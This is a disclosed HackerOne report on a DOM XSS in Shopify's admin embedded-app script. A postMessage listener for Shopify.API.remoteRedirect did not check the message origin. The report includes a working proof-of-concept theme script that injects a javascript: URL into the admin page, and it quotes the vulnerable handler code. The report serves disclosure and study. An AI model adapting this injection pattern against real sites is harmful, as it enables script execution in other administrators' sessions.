# DOM XSS via Shopify.API.remoteRedirect

## Report Details
- **Report ID**: 576532
- **URL**: https://hackerone.com/reports/576532
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-05-10T15:05:16.793Z
- **Disclosed**: 2019-06-05T23:24:37.469Z

## Reporter
- **Username**: yxw21
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
hi, team, after I read the report #422043, I found another monitor postmessage, and did not correctly verify the origin, leading to dom xss, using the store theme can write js this feature, we can modify a theme for the following Payload, 
```
<script>
  function attack(){
  	var ctx=window.open('https://cuxuri.myshopify.com/admin/themes');
    var interval;
    interval=setInterval(function(){
      if(window.attackSuccess){
        clearInterval(interval);
      }else{
        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
      }
    },500);;
  }
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```
then log in to the store, access the page containing the payload, you can trigger xss, 
such as:

{F487966}

Problem code:
```
https://cdn.shopifycloud.com/web/assets/latest/embeddedApp-ab64a8a13eb3f06403cb2acf67e20576a144bf2d3625807923872e8adf469a14.js
case de.RemoteRedirect:
                            this.handleRemoteRedirect(t.location);
                            break;
```

## Impact

Attack other administrators

## Attachments
- 1.png
